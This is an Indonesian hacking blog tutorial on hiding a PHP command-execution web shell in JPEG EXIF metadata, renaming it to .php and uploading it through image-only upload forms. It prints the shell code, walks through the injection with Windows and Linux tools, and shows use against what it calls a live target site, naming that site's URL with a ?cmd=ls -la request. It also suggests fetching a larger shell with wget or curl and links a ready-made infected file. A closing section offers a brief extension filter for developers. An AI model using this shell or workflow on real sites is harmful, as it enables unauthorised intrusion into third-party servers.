---
title: 'Trik Inject PHP Script ke File Gambar (Jpg, Png, etc)'
date: 2016-10-11T01:59:00.000-07:00
draft: false
aliases: [ "/2016/10/trik-inject-php-script-ke-file-gambar.html" ]
tags : [Knowledge]
---

[![](https://3.bp.blogspot.com/-ZywvCZwwQDc/V_yOjihS4SI/AAAAAAAABKU/iuLqTOemzpAEPRtEj2wI0MJREHgR4bojwCLcB/s400/logoinject.png)](https://3.bp.blogspot.com/-ZywvCZwwQDc/V_yOjihS4SI/AAAAAAAABKU/iuLqTOemzpAEPRtEj2wI0MJREHgR4bojwCLcB/s1600/logoinject.png)

**\[UPDATED 15.10.2016 19:16:55\]**  
  
Holaa sobat setia yuzanotes dimanapun berada,  
gmna kabarnya hari ini, semoga sehat selalu ya.  
Seperti pada judul kali ini gw mo mbahas trik lama, namun msih belum banyak yang tau.  
  
Oke langsung saja ke pokok permasalahan.  
Pernah nggak sih agan ketemu dengan form file upload, tapi hanya memperbolehkan file image only? pasti pernah kan, kebanyakan orang mungkin make teknik tamper data atau bisa juga make live http header, tapi cara ini tidak 100% work.  
  
Nah pada tutor kali ini gw mw share cara manipulasi backdoor ke file jpg,  
ya walaupun dengan cara ini tidak mnjamin 100% backdoor akan terupload juga :'v , setidaknya nambah wawasan agan-sista pembaca dsini, mengenai method upload shell backdoor ^\_^  
  
**PERSIAPAN :**  
**1**. Target  
**2**. Niat  
  
Windows :  
\- Quick EXIF Editor ( [download disini](http://adf.ly/1eqbCm) ; pass: yuzan0tes )  
\- Exif Pilot  
**NOTE** :  pada tutorial ini gw make Quick EXIF Editor  
  
Linux :  
\- Exif (apt-get install exif)  
\- Exiv2 (apt-get install exiv2)  
\- Jhead (apt-get install jhead)  
**NOTE** : install salah satu saja, pada tutorial kali ini gw make jhead (jpg only)  
  
Code PHP Inject  

Plain Text

> <style>body{font-size: 0;}h1{font-size: 12px}</style><h1>  
> <?php if(isset($\_REQUEST\['cmd'\])){system($\_REQUEST\['cmd'\]);}else{echo 'HELLO WORLD  
> ';}\_\_halt\_compiler();?></h1>

With Image

> <style>body{font-size: 0;}h1{font-size: 12px}</style><h1>  
> <?php if(isset($\_REQUEST\['cmd'\])){system($\_REQUEST\['cmd'\]);}else{echo '<img src="LINK GAMBAR" border=0>  
> ';}\_\_halt\_compiler();?></h1>

  
**LANGKAH-LANGKAH MANIPULASI :**  
  

WINDOWS

**1**. Download toolnya dulu (diatas)  

_Penampakan tool_

[![](https://4.bp.blogspot.com/-GCP-KfrsZWI/WAGZvoBrQQI/AAAAAAAABMo/MI9T9OxPbDAfK8ds8UNDFEj50rJuhKtBACEw/s320/Screenshot_1.png)](https://4.bp.blogspot.com/-GCP-KfrsZWI/WAGZvoBrQQI/AAAAAAAABMo/MI9T9OxPbDAfK8ds8UNDFEj50rJuhKtBACEw/s1600/Screenshot_1.png)

**2**. Siapin gambar yang mau di inject  
**3**. Buka toolnya, klik "Open" lalu pilih gambarnya  
**4**. Klik tanda +  

[![](https://3.bp.blogspot.com/-OUxdPyhL76U/WAGZy1cxmuI/AAAAAAAABNE/_JNl4EuDxJQTmlTBi2YNkLlZVqUrtbZGQCEw/s640/Screenshot_3.png)](https://3.bp.blogspot.com/-OUxdPyhL76U/WAGZy1cxmuI/AAAAAAAABNE/_JNl4EuDxJQTmlTBi2YNkLlZVqUrtbZGQCEw/s1600/Screenshot_3.png)

  

_Klik "Yes" sadjha :'''v_

[![](https://3.bp.blogspot.com/---FmeoqmRyE/WAGZxMJK5bI/AAAAAAAABM4/7HcXwLsmGDUsXOW8h7ir2xsk_2LUPyPywCEw/s640/Screenshot_2.png)](https://3.bp.blogspot.com/---FmeoqmRyE/WAGZxMJK5bI/AAAAAAAABM4/7HcXwLsmGDUsXOW8h7ir2xsk_2LUPyPywCEw/s1600/Screenshot_2.png)

**5**. Ubah Type dan Value, Samakan seperti ini, Value isi bebas terserah. Kalo udah klik Add  

[![](https://2.bp.blogspot.com/-FiDZZiL-8Dk/WAGZzSiGkQI/AAAAAAAABNI/mwf27OwOKpIpzDPwT2hxXl7OZ6jpXcDZQCEw/s640/Screenshot_4.png)](https://2.bp.blogspot.com/-FiDZZiL-8Dk/WAGZzSiGkQI/AAAAAAAABNI/mwf27OwOKpIpzDPwT2hxXl7OZ6jpXcDZQCEw/s1600/Screenshot_4.png)

**6**. Klik pada pending change, lihat gambar dibawah  

[![](https://4.bp.blogspot.com/-BqZXQgcJpgE/WAGZzjBrJEI/AAAAAAAABNM/CqUCHv4lUKM_3dXdNAhDYakKKQKQPfsTwCEw/s640/Screenshot_5.png)](https://4.bp.blogspot.com/-BqZXQgcJpgE/WAGZzjBrJEI/AAAAAAAABNM/CqUCHv4lUKM_3dXdNAhDYakKKQKQPfsTwCEw/s1600/Screenshot_5.png)

**7**. Klik di "New value" terus "Edit Modification"  

[![](https://3.bp.blogspot.com/-6KgA4ECrsAA/WAGZzr8Bx3I/AAAAAAAABNQ/77YY6A5zXnQ_hUpB36O3DHL-Epttm6B8wCEw/s640/Screenshot_6.png)](https://3.bp.blogspot.com/-6KgA4ECrsAA/WAGZzr8Bx3I/AAAAAAAABNQ/77YY6A5zXnQ_hUpB36O3DHL-Epttm6B8wCEw/s1600/Screenshot_6.png)

**8**. Nah sampe sini, tinggal ganti New value dengan Code PHP Inject, dan konfigurasi dikit, lihat gambar di bawah  

[![](https://2.bp.blogspot.com/-Jya_lf8e5so/WAGZ0Nz-xLI/AAAAAAAABNU/WhSzqxUAVXYc8_hs9nvuhya77PIJLkQzQCEw/s640/Screenshot_7.png)](https://2.bp.blogspot.com/-Jya_lf8e5so/WAGZ0Nz-xLI/AAAAAAAABNU/WhSzqxUAVXYc8_hs9nvuhya77PIJLkQzQCEw/s1600/Screenshot_7.png)

[![](https://3.bp.blogspot.com/-Vcs7hWZEUTM/WAGZ0ADPZHI/AAAAAAAABNY/kDgsJCCmWV0NQV7qs9k1brDrcpNpWYbswCEw/s640/Screenshot_8.png)](https://3.bp.blogspot.com/-Vcs7hWZEUTM/WAGZ0ADPZHI/AAAAAAAABNY/kDgsJCCmWV0NQV7qs9k1brDrcpNpWYbswCEw/s1600/Screenshot_8.png)

[![](https://4.bp.blogspot.com/-hX2c5m6chxQ/WAGZvu6x0RI/AAAAAAAABMk/SMNZ538w_yUMQQxfCqVBjYGPjywzsmKUwCEw/s640/Screenshot_10.png)](https://4.bp.blogspot.com/-hX2c5m6chxQ/WAGZvu6x0RI/AAAAAAAABMk/SMNZ538w_yUMQQxfCqVBjYGPjywzsmKUwCEw/s1600/Screenshot_10.png)

[![](https://1.bp.blogspot.com/-JA8lF2FK3ww/WAGZvkcqfmI/AAAAAAAABMg/yeEnRdtJJvMWUMrSfyeDZy1QNyugYURyQCEw/s640/Screenshot_12.png)](https://1.bp.blogspot.com/-JA8lF2FK3ww/WAGZvkcqfmI/AAAAAAAABMg/yeEnRdtJJvMWUMrSfyeDZy1QNyugYURyQCEw/s1600/Screenshot_12.png)

[![](https://3.bp.blogspot.com/-2vDTfXh6HlQ/WAGZwfPN_LI/AAAAAAAABMs/Mb1hKpY6LEw-i2EJsEqpaCS49SYxmmrvQCEw/s640/Screenshot_13.png)](https://3.bp.blogspot.com/-2vDTfXh6HlQ/WAGZwfPN_LI/AAAAAAAABMs/Mb1hKpY6LEw-i2EJsEqpaCS49SYxmmrvQCEw/s1600/Screenshot_13.png)

  
**Cara cek code php inject sudah masuk atau belum**  
**1**. Open with text editor, gw make notepad++  

[![](https://3.bp.blogspot.com/-HXm4o6XCfmU/WAGZwWeX9II/AAAAAAAABMw/Pyw04FqYAfIgcYsDtN4OGqf0UpjTMxuPQCEw/s640/Screenshot_14.png)](https://3.bp.blogspot.com/-HXm4o6XCfmU/WAGZwWeX9II/AAAAAAAABMw/Pyw04FqYAfIgcYsDtN4OGqf0UpjTMxuPQCEw/s1600/Screenshot_14.png)

** 2**. Nah kalo udah kek gini brarti sudah ke inject ^\_^

[![](https://1.bp.blogspot.com/-ZqYBDx66x08/WAGZw9bwLmI/AAAAAAAABM0/X6YjybZmmD8KOJFzNzv5P9I859VmtnZbwCEw/s640/Screenshot_19.png)](https://1.bp.blogspot.com/-ZqYBDx66x08/WAGZw9bwLmI/AAAAAAAABM0/X6YjybZmmD8KOJFzNzv5P9I859VmtnZbwCEw/s1600/Screenshot_19.png)

  
**Tes di localhost**  
**1**. Nah bisaa kan :'''v  

[![](https://3.bp.blogspot.com/-9JYeUtyGVl4/WAGZyo9aQOI/AAAAAAAABM8/GHMxEpp9IkUyMtLKHEDHFsMi5GuZdY2fACEw/s640/Screenshot_20.png)](https://3.bp.blogspot.com/-9JYeUtyGVl4/WAGZyo9aQOI/AAAAAAAABM8/GHMxEpp9IkUyMtLKHEDHFsMi5GuZdY2fACEw/s1600/Screenshot_20.png)

**2**. Ini gw make IIS7, gini penampakannya  

[![](https://1.bp.blogspot.com/-xh9GFCrSlnw/WAGZy8p7urI/AAAAAAAABNA/HuiNpBCTvKAdegrsjnwPZlVHDbH_oYtGgCEw/s640/Screenshot_21.png)](https://1.bp.blogspot.com/-xh9GFCrSlnw/WAGZy8p7urI/AAAAAAAABNA/HuiNpBCTvKAdegrsjnwPZlVHDbH_oYtGgCEw/s1600/Screenshot_21.png)

  
  

LINUX

**1**. jhead -h = bwat lihat command dasarnya  
**2**. Siapkan gambarnya (.jpg) \*cari di gugel njing :'''v  

[![](https://2.bp.blogspot.com/-ZKztBsA12gg/V_yUbY2ZhSI/AAAAAAAABKo/nQx3l1GDo44St6lX8Hvkib8JSXunivSswCLcB/s400/mia.jpg)](https://2.bp.blogspot.com/-ZKztBsA12gg/V_yUbY2ZhSI/AAAAAAAABKo/nQx3l1GDo44St6lX8Hvkib8JSXunivSswCLcB/s1600/mia.jpg)

**3**. lakukan command ini: jhead -purejpg filemu.jpg  . fungsinya untuk menghapus comment, info, tag bawaan gambar  
**4**. Sekarang kita sisipkan file php dengan command: jhead -ce filemu.jpg  
Seteleh itu akan muncul default text editor VI  
Masukkan salah satu Code PHP Inject yg sudah gw sediain di atas  
**Screenshot**:  

[![](https://2.bp.blogspot.com/--pRyguA_3KI/V_yZ3oZ039I/AAAAAAAABK8/bl2xCv7SD4cBz6Q8v_2YgamUQgUK3GW-wCEw/s640/Selection_004.jpg)](https://2.bp.blogspot.com/--pRyguA_3KI/V_yZ3oZ039I/AAAAAAAABK8/bl2xCv7SD4cBz6Q8v_2YgamUQgUK3GW-wCEw/s1600/Selection_004.jpg)

  

Setelah itu save. Jika sukses, muncul "_Modified: filemu.jpg_"

[![](https://4.bp.blogspot.com/-IjZLAEW1_uc/V_yZ2mKsDvI/AAAAAAAABK4/0Qx-zCOvwtU5d6ohg3ZWdJawlWyI6r9dQCLcB/s640/Selection_005.jpg)](https://4.bp.blogspot.com/-IjZLAEW1_uc/V_yZ2mKsDvI/AAAAAAAABK4/0Qx-zCOvwtU5d6ohg3ZWdJawlWyI6r9dQCLcB/s1600/Selection_005.jpg)

**5**. Cek script, sudah masuk atau belum, dengan command: jhead filemu.jpg  

_Klo result begini berarti sukses_

[![](https://4.bp.blogspot.com/-0ZoKH3pwTjM/V_ybGzPqAaI/AAAAAAAABLE/5dI7DqaluMgrNkalEWdlWf2rw2PihUY3gCLcB/s640/Selection_006.jpg)](https://4.bp.blogspot.com/-0ZoKH3pwTjM/V_ybGzPqAaI/AAAAAAAABLE/5dI7DqaluMgrNkalEWdlWf2rw2PihUY3gCLcB/s1600/Selection_006.jpg)

**6**. Selanjutnya rename filenya ke .php , lalu upload ke Tergetmu  
_\*_Ingat cara ini tidak 100% bisa  
  
  
**EKSEKUSI TARGET :**  
**1**. Gw dah punya live target,  
**Screenshot:**  

[![](https://1.bp.blogspot.com/-kVUkxHy9hbs/V_ydMWeKtDI/AAAAAAAABLQ/P-TSuPpufeg6iN6BG5xkWjUq-NjDNZGVgCLcB/s640/Selection_001.jpg)](https://1.bp.blogspot.com/-kVUkxHy9hbs/V_ydMWeKtDI/AAAAAAAABLQ/P-TSuPpufeg6iN6BG5xkWjUq-NjDNZGVgCLcB/s1600/Selection_001.jpg)

**2**. Oke, kita coba test dulu dengan file php uploader biasa  
**Screenshot:**  

[![](https://3.bp.blogspot.com/-Av6cB0nq7Jw/V_ydObcM2OI/AAAAAAAABLU/ePu2EPPoqksNv7UWRxsvxdVl81SuA3JAACLcB/s640/Selection_002.jpg)](https://3.bp.blogspot.com/-Av6cB0nq7Jw/V_ydObcM2OI/AAAAAAAABLU/ePu2EPPoqksNv7UWRxsvxdVl81SuA3JAACLcB/s1600/Selection_002.jpg)

**3**. Daaaann, gagal --\_\_--  
**Screenshot:**  

[![](https://1.bp.blogspot.com/-59VG2Dsr8N8/V_ydOmsB-KI/AAAAAAAABLY/9T-Q9DeLF2QPQrlP0gGwMujNmhJQ46jzgCLcB/s640/Selection_003.jpg)](https://1.bp.blogspot.com/-59VG2Dsr8N8/V_ydOmsB-KI/AAAAAAAABLY/9T-Q9DeLF2QPQrlP0gGwMujNmhJQ46jzgCLcB/s1600/Selection_003.jpg)

**4**. Sekarang waktunya beraksi, siapkan file .php yang tadi sudah di inject tadi, lalu upload, daaan  
crooots.. file uploaded yeah :''v  
**Screenshot:**  

[![](https://2.bp.blogspot.com/-NzX9WRRhMVE/V_yfLdQJ2SI/AAAAAAAABLk/uykjasMHFSE5sqEmAX_1q-v3xsQEpUNiQCLcB/s640/Selection_007.jpg)](https://2.bp.blogspot.com/-NzX9WRRhMVE/V_yfLdQJ2SI/AAAAAAAABLk/uykjasMHFSE5sqEmAX_1q-v3xsQEpUNiQCLcB/s1600/Selection_007.jpg)

**5**. Buka filenya, dan jangan kaget kalo yang muncul gambar doang \*btw ini namanya Mia Khalifa :'''v  
**Screenshot:**  

[![](https://3.bp.blogspot.com/-UsbB3u_hGWc/V_yglrT0mFI/AAAAAAAABLw/xgqdU-bjfVkpYHL1A8POAc6WvP39hdRbwCLcB/s640/Selection_008.jpg)](https://3.bp.blogspot.com/-UsbB3u_hGWc/V_yglrT0mFI/AAAAAAAABLw/xgqdU-bjfVkpYHL1A8POAc6WvP39hdRbwCLcB/s1600/Selection_008.jpg)

**Cara Penggunaan** **:**  
**1**. Cara melihat isi direktori supaya bisa tersusun rapi, seperti ini:  
view-source:http://www.wtinntal.at/import/mia.php?cmd=ls -la  

[![](https://1.bp.blogspot.com/-eJL9Zxw0mJY/V_yhskwc6vI/AAAAAAAABL4/yK-YJ641Q-M3IjC2xqmSfpocl2tD2W0TACLcB/s640/Selection_009.jpg)](https://1.bp.blogspot.com/-eJL9Zxw0mJY/V_yhskwc6vI/AAAAAAAABL4/yK-YJ641Q-M3IjC2xqmSfpocl2tD2W0TACLcB/s1600/Selection_009.jpg)

**2**. Upload shell, gunakan fungsi wget, curl, atau cara lain (karena tdak smua web support wget)  

[Lihat pada tutorial ini](http://blog.yuzaside.com/2016/08/trik-menyisipkan-hidden-backdoor.html)

  
**3**. Setelah itu terserah mau diapain itu web :)  

[![](https://3.bp.blogspot.com/-6WyheoJ1WW8/V_yoPVdHpxI/AAAAAAAABMI/YmFRxWiP84kie7RVpUFrPqEvKKhIpgzXgCLcB/s640/Selection_011.jpg)](https://3.bp.blogspot.com/-6WyheoJ1WW8/V_yoPVdHpxI/AAAAAAAABMI/YmFRxWiP84kie7RVpUFrPqEvKKhIpgzXgCLcB/s1600/Selection_011.jpg)

  
**CATATAN :**  
Gunakan command sesuai os server yg di pakai webnya, kalo linux make command linux kalo windows ya windows :'''v  
intinya hanya perlu menjalankan command: SITE.COM/filemu.php?cmd=PERINTAH  
?cmd= > Harus diawali dengan ini  
PERINTAH \> Sesuaikan dengan os yg dipakai server, pelajari command" dasarnya juga \*Cari referensi di google  
  

Bagi yang pengen langsung jadi / gak mau repot, ini file jpg yang sudah di inject php script bisa di download [disini](http://adf.ly/1ekf0e)

  

Cara Menghindari Trik ini Untuk Web Developer

Inti dari trik ini adalah memanipulasi file php menjadi jpg (image/gambar)  
jika agan developer salah satu web, agan hanya perlu menambahkan filter exstensi saja,  
jadi, kurang lebih seperti ini :  
\*sesuaikan dengan keperluan di web agan, d bwah ini hanya .jpg, .jpeg, .png & .gif  

> \[// Code Filter extensi by m1x  
> if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"  
> && $imageFileType != "gif" ) {  
>     echo "Maaf bosq, hanya .jpg, .jpeg, .png & .gif files saja yang diperbolehkan.";  
>     $uploadOk = 0;  
> }\]

  
Sampe sini dulu tutor hari ini,  
Semoga Bermanfaat ^\_^